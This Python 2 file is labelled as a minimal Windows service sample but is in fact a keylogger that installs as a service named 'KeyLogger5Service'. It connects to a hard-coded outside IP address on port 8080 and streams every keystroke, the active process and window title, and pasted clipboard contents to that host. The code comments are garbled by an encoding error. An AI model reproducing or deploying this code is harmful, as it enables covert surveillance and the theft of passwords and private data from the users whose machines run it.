# -*- coding: utf-8 -*- 
# SmallestService.py
#
# A sample demonstrating the smallest possible service written in Python.

import win32serviceutil
import win32service
import win32event
import time

from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import socket


current_window = None
  
keylooger_cache=''

from win32con import OUT_CHARACTER_PRECIS

class key_service(win32serviceutil.ServiceFramework):
    _svc_name_ = "KeyLogger5Service"
    _svc_display_name_ = "keykeykey5"
    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        # Create an event which we will use to wait on.
        # The "service stop" request will set this event.
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        # Before we do anything, tell the SCM we are starting the stop process.
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        # And set my event.
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        #what to do#
        
        user32 = windll.user32
        kernel32 = windll.kernel32
        psapi = windll.psapi

        target_host = "59.78.26.99"
        target_port = 8080
        client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client.connect((target_host,target_port))
        print 'xxxxxxxxxx'
        client.send("start logging")
        
        while True:
        
            def get_current_process():
                global keylooger_cache
                # ��ȡ���ϲ�Ĵ��ھ��
                hwnd = user32.GetForegroundWindow()
      
                # ��ȡ���ID
                pid = c_ulong(0)
                user32.GetWindowThreadProcessId(hwnd,byref(pid))
      
                # �����ID���������
                process_id = "%d" % pid.value
      
                # �����ڴ�
                executable = create_string_buffer("\x00"*512)    
                h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
      
                psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
      
                # ��ȡ���ڱ���
                windows_title = create_string_buffer("\x00"*512)
                length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
      
                # ��ӡ
                #print
                out="[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value)
                #print "[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value)
                client.send(out)
                keylooger_cache+=out
                keylooger_cache+='\n'
                #print
      
                # �ر�handles
                kernel32.CloseHandle(hwnd)
                kernel32.CloseHandle(h_process)
      
    # �����������¼�����
            def KeyStroke(event):
      
                global current_window
                global keylooger_cache
                # ���Ŀ�괰���Ƿ�ת��(��������ھͼ����µĴ���)
                if event.WindowName != current_window:
                    current_window = event.WindowName
                    # �������
                    get_current_process()
      
                # �������Ƿ񳣹水�����ϼ�ȣ�
                if event.Ascii > 32 and event.Ascii <127:
                    #print chr(event.Ascii),
                    client.send(chr(event.Ascii))
                else:
                    # �����Ctrl+v��ճ���¼����Ͱ�ճ������ݼ�¼����
                    if event.Key == "V":
                        win32clipboard.OpenClipboard()
                        pasted_value = win32clipboard.GetClipboardData()
                        win32clipboard.CloseClipboard()
                        out="[PASTE]-%s " % (pasted_value)
                        # print "[PASTE]-%s" % (pasted_value),
                        #print out
                        client.send(out)
                        keylooger_cache+=out
                    else:
                        out="[%s] " % event.Key
                        #print "[%s]" % event.Key,
                        keylooger_cache+=out
                        client.send(out)
                # ѭ��������һ�������¼�
                return True
            kl = pyHook.HookManager()
            kl.KeyDown = KeyStroke
    
            # ע��hook��ִ��
            kl.HookKeyboard()
            pythoncom.PumpMessages(10000)
        
        win32event.WaitForSingleObject(self.hWaitStop, win32event.INFINITE)

if __name__=='__main__':
    win32serviceutil.HandleCommandLine(key_service) 